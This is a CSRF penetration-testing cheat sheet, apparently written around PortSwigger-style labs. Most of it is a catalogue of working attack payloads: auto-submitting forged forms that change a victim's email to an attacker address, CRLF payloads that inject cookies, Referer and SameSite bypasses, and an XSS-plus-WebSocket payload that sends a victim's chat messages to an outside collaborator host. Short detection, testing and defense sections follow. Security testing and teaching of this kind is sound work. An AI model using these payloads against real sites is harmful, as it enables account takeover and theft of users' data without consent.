# CSRF Quickstart

CSRF forces an authenticated victim's browser to perform unwanted state-changing actions on a target site using their existing session.

## Quick identification

1. **Token present?** Look for `csrf` (or similar) param in POST body. Absent → vulnerable.
2. **Token validated?** Change to invalid value → still works → vulnerable.
3. **Token required?** Remove entirely → still works → vulnerable.
4. **Token session-bound?** Use another user's token → works → vulnerable.
5. **Method check?** `GET /change-email?email=...` works → method-bypass vulnerable.
6. **Referer check?** Remove Referer → works → vulnerable. Set `Referer: https://evil.com?legitimate-domain.com` → works → substring-match vulnerable.

## Basic exploit template

```html
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="TOKEN-IF-NEEDED">
</form>
<script>document.forms[0].submit();</script>
```

## Bypass catalog

### 1. Method bypass (only POST validates token)
```html
<form action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### 2. Token not session-bound
Use attacker's own valid token in the form. Any valid token accepted.

### 3. Token in cookie + CRLF injection
Token validates against `csrfKey` cookie; CRLF lets attacker inject the matching cookie:
```html
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=fake%3b%20SameSite=None"
     onerror="document.forms[0].submit();">
```

### 4. Double-submit cookie (cookie == param)
```html
<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
     onerror="document.forms[0].submit();">
```

### 5. Token validated only if present
Omit the `csrf` parameter entirely.

### 6. Referer validated only if present
Suppress Referer:
```html
<meta name="referrer" content="no-referrer">
```

### 7. Substring Referer match
Set Referer URL to include target domain as substring:
```html
<meta name="referrer" content="unsafe-url">
<script>
  history.pushState("", "", "/?target.com");
  document.forms[0].submit();
</script>
```

### 8. SameSite Strict via redirect path traversal
```html
<script>
  document.location = "https://target.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40attacker.com%26submit=1";
</script>
```

### 9. SameSite Strict via sibling-domain XSS + WebSocket
XSS on `cms-target.com` → WebSocket on `target.com/chat` (same registrable domain, no SameSite enforcement on WebSocket):
```html
<script>
var payload = `<script>
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = () => ws.send('READY');
ws.onmessage = e => fetch('https://collaborator.com',{method:'POST',mode:'no-cors',body:e.data});
<\/script>`;
document.location = "https://cms-target.com/login?username="+encodeURIComponent(payload)+"&password=x";
</script>
```

### 10. SameSite Lax + `_method` override
```html
<script>document.location = "https://target.com/change-email?email=pwned@attacker.com&_method=POST";</script>
```

## Detection checklist

| Test | Action | Vulnerable when |
|------|--------|-----------------|
| Token present | inspect POST body | no `csrf` param |
| Token validated | `csrf=invalid` | request succeeds |
| Token required | remove param | request succeeds |
| Session-bound | use another user's token | request succeeds |
| Method check | POST→GET | request succeeds |
| Referer check | remove Referer | request succeeds |
| Referer substring | `evil.com?target.com` | request succeeds |
| SameSite set | response `Set-Cookie` | no `SameSite=` |
| Method override | `?_method=POST` in GET | request succeeds |

## Burp workflow

1. Proxy → intercept ON → submit form → capture POST.
2. Send to Repeater (Ctrl+R). Test variations: invalid token / missing token / GET / no Referer.
3. Generate PoC: right-click → Engagement Tools → Generate CSRF PoC → enable auto-submit. (Burp Pro)
4. Test on Burp exploit server: paste HTML in Body → Store → View exploit → Deliver to victim.

## CRLF cookie injection payloads

```
?search=test%0d%0aSet-Cookie:%20csrf=fake
?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

URL encoding: `%0d` CR, `%0a` LF, `%20` space, `%3b` `;`, `%3c` `<`, `%3e` `>`, `%26` `&`, `%27` `'`, `%22` `"`.

## Defense

```python
# Token generation + validation
import secrets
session['csrf_token'] = secrets.token_urlsafe(32)

def validate_csrf(req, sess):
    return req.form.get('csrf') == sess.get('csrf_token')
```

```
Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict; Path=/
```

```python
from urllib.parse import urlparse
referer = request.headers.get('Referer')
if not referer: return False
if urlparse(referer).hostname != expected_domain: return False
```

## Testing script

```python
import requests

def test_csrf(url, cookie):
    r = requests.post(url, data={'email':'test@test.com'}, cookies={'session':cookie})
    return r.status_code == 200

def test_methods(url, cookie):
    for m in ['GET','POST','PUT','DELETE','PATCH']:
        r = requests.request(m, url, data={'email':'test@test.com'}, cookies={'session':cookie})
        if r.status_code == 200: print(f"[!] {m} works without CSRF token")
```

## Troubleshooting

- Use unique email each test (server may reject duplicates as success).
- Some tokens are single-use — fetch a fresh one before each attempt.
- Verify CRLF encoding (`%0d%0a`), semicolon (`%3b`), `SameSite=None` for cross-site cookies.
- For SameSite=Lax test in Chrome top-level nav (`document.location`).
- For SameSite=Strict need same-site gadget (XSS / open redirect).

## Resources

- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- See `scenarios/xss/csrf-via-xss.md` for chaining CSRF with XSS.
